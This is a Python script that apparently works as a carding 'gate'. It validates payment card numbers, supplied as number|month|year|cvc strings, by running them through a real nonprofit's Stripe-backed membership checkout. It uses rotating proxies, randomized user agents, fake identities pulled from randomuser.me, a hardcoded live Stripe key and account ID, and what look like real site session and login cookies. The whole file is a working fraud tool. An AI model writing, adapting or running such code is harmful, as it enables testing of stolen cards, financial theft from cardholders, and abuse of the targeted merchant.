import requests
import re
from user_agent import generate_user_agent
from bs4 import BeautifulSoup
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
from colorama import Fore, Style
from proxy import reqproxy
#$10
def fake_user():
   response = requests.get('https://randomuser.me/api/1.2/?nat=us')
   data = response.text
   name_match = re.search(r'"first":"(.*?)"', data)
   name = name_match.group(1) if name_match else ''
   last_match = re.search(r'"last":"(.*?)"', data)
   last = last_match.group(1) if last_match else ''
   email_match = re.search(r'"email":"(.*?)"', data)
   email = email_match.group(1) if email_match else ''
   street_match = re.search(r'"street":"(.*?)"', data)
   street = street_match.group(1) if street_match else ''
   city_match = re.search(r'"city":"(.*?)"', data)
   city = city_match.group(1) if city_match else ''
   state_match = re.search(r'"state":"(.*?)"', data)
   state = state_match.group(1) if state_match else ''
   phone_match = re.search(r'"phone":"(.*?)"', data)
   phone = phone_match.group(1) if phone_match else ''
   postcode_match = re.search(r'"postcode":(.*?),', data)
   postcode = postcode_match.group(1) if postcode_match else ''
   return name, last, email, street, city, state, phone, postcode

def Tele(ccx):
    session, ip_address = reqproxy()
    ccx = ccx.strip()
    n, mm, yy, cvc = ccx.split("|")

    if "20" in yy:
        yy = yy.split("20")[1]
   
    name, last, email, street, city, state, phone, postcode = fake_user()
    
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Not A(Brand";v="24", "Chromium";v="110"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': generate_user_agent(),
    }

    data = f'type=card&billing_details[address][line1]=11212+Texas+151&billing_details[address][line2]=&billing_details[address][city]=San+Antonio&billing_details[address][state]=TX&billing_details[address][postal_code]=78251&billing_details[address][country]=US&billing_details[name]=Glenda+Homenick&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=0ed3ead2-6862-4522-94cb-374f5f846bb57c7cef&muid=065da537-4931-4b6c-815b-b6e07add7edccf1ce1&sid=269e0b10-d49e-45a6-8070-233611daecefd018a7&payment_user_agent=stripe.js%2Fdf61bd3d21%3B+stripe-js-v3%2Fdf61bd3d21%3B+split-card-element&referrer=https%3A%2F%2Fharvardconservationtrust.org&time_on_page=125523&key=pk_live_1a4WfCRJEoV9QNmww9ovjaR2Drltj9JA3tJEWTBi4Ixmr8t3q5nDIANah1o0SdutQx4lUQykrh9bi3t4dR186AR8P00KY9kjRvX&_stripe_account=acct_1K47K1BCPUKmloR7'
    response = session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    try:
       id = response.json()['id']
       print(Fore.GREEN + "PM: ",id, "Proxy is Live: ", ip_address, "gatet0" + Style.RESET_ALL)
    except:
           return '#'

    url = 'https://harvardconservationtrust.org/membership-account/membership-checkout/'
    headers1 = {
        'authority': 'harvardconservationtrust.org',
        'accept': 'application/json',
        'accept-language': 'fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://harvardconservationtrust.org',
        'referer': 'https://harvardconservationtrust.org/membership-account/membership-checkout/',
        'sec-ch-ua': '"Not A(Brand";v="24", "Chromium";v="110"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': generate_user_agent(),
    }
    cookies = {
    "__stripe_mid": "065da537-4931-4b6c-815b-b6e07add7edccf1ce1",
    "__stripe_sid": "269e0b10-d49e-45a6-8070-233611daecefd018a7",
    "_lscache_vary": "82d85ee402cc5325d31e92ae7f57c523",
    "PHPSESSID": "fe76ee9f1c5268c2314d26ece555b5cd",
    "pmpro_visit": "1",
    "wfwaf-authcookie-2d74e26f642a56b7582e4ac5160eb7f7": "4140%7Csubscriber%7Cread%7C4998f73d44974c094e7fb3f1038c65be30a296874b69b236a0266925d2d5ed87",
    "wordpress_logged_in_68054b933525b73ee5d51774ce6da0a6": "thih090%40bugfoo.com%7C1699720602%7CyXbZ5XyqWENSUMQ7seveKTAelzRTd4ZG3Id6EYwBiu1%7Ca680ac196338976bfd08d0bbe60596f3b31d650824cc1c99b6b2226c0f9ecf15"
    }
    data2 = {
       'level': '3',
       'checkjavascript': '1',
       'other_discount_code': '',
       'processing_fees': 'on',
       'gateway': 'stripe',
       'bfirstname': name,
       'blastname': last,
       'baddress1': street,
       'baddress2': '',
       'bcity': city,
       'bstate': state,
       'bzipcode': postcode,
       'bcountry': 'US',
       'bphone': phone,
       'bemail': email,
       'bconfirmemail': email,
       'CardType': 'visa',
       'discount_code': '',
       'additional_lists[]': '24afe720c2',
       'submit-checkout': '1',
       'javascriptok': '1',
       'payment_method_id': id,
       'AccountNumber': n,
       'ExpirationMonth': mm,
       'ExpirationYear': yy,
    }

    response = session.post(url, headers=headers1, data=data2, cookies=cookies, verify=False)
    try:
       result2 = response.text
    except:
	    return "succeeded"
    return result2
    
print("working gatet 0")
